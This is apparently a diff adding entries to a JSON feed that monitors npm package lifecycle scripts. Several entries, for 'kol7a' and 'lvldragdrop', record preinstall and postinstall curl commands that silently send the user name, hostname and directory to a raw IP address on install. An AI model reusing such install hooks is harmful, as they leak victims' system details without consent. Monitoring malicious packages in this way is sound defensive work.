@@ -1,5 +1,59 @@
 [
   {
+    "packageName": "kol7a",
+    "version": "99.99.1",
+    "scriptType": "postinstall",
+    "scriptContent": "curl -s \"http://157.90.122.24/devopsecurity/kol7a/?u=$(whoami)&h=$(hostname)&d=$PWD&t=$(date +%s)\" > /dev/null || true",
+    "previousVersion": null,
+    "timestamp": "2026-01-27T14:41:51.525Z",
+    "issuesend": false
+  },
+  {
+    "packageName": "kol7a",
+    "version": "99.99.1",
+    "scriptType": "preinstall",
+    "scriptContent": "curl -s \"http://157.90.122.24/devopsecurity/kol7a/?u=$(whoami)&h=$(hostname)&d=$PWD&t=$(date +%s)\" > /dev/null || true",
+    "previousVersion": null,
+    "timestamp": "2026-01-27T14:41:51.524Z",
+    "issuesend": false
+  },
+  {
+    "packageName": "lvldragdrop",
+    "version": "99.99.1",
+    "scriptType": "postinstall",
+    "scriptContent": "curl -s \"http://157.90.122.24/devopsecurity/lvldragdrop/?u=$(whoami)&h=$(hostname)&d=$PWD&t=$(date +%s)\" > /dev/null || true",
+    "previousVersion": null,
+    "timestamp": "2026-01-27T14:41:50.468Z",
+    "issuesend": false
+  },
+  {
+    "packageName": "lvldragdrop",
+    "version": "99.99.1",
+    "scriptType": "preinstall",
+    "scriptContent": "curl -s \"http://157.90.122.24/devopsecurity/lvldragdrop/?u=$(whoami)&h=$(hostname)&d=$PWD&t=$(date +%s)\" > /dev/null || true",
+    "previousVersion": null,
+    "timestamp": "2026-01-27T14:41:50.466Z",
+    "issuesend": false
+  },
+  {
+    "packageName": "npm-shdoc",
+    "version": "0.0.16",
+    "scriptType": "postinstall",
+    "scriptContent": "chmod +x ./postinstall.sh && bash ./postinstall.sh",
+    "previousVersion": "0.0.14",
+    "timestamp": "2026-01-27T14:40:46.918Z",
+    "issuesend": true
+  },
+  {
+    "packageName": "@heartlandone/vega-sandbox-pr-2600-946608dc4b556d5d1aa09725d4ea72b1187c05b8",
+    "version": "2.72.0",
+    "scriptType": "postbuild",
+    "scriptContent": "cp dist/vega/*.css style/ && npm run postbuild:SRI && npm run postbuild:angular && npm run postbuild:vue && npm run postbuild:react && npm run postbuild:dist-check",
+    "previousVersion": null,
+    "timestamp": "2026-01-27T14:40:14.374Z",
+    "issuesend": false
+  },
+  {
     "packageName": "desktop-commander-enhanced",
     "version": "0.3.1",
     "scriptType": "postinstall",
